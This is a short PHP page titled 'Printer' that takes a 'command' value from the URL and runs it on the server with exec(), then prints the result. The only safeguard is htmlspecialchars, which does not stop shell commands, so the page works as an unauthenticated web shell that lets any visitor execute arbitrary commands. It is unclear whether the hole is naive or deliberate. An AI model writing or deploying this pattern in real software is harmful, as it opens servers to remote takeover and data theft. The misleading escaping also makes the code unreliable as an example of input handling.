<html lang="ru">

<head>
    <title>Printer</title>
</head>

<body>
    <?php
    $output = null;

    $command = htmlspecialchars($_GET["command"]);
    exec($command, $output);

    require __DIR__ . '/command.php';
    printResult($output);
    ?>
</body>

</html>

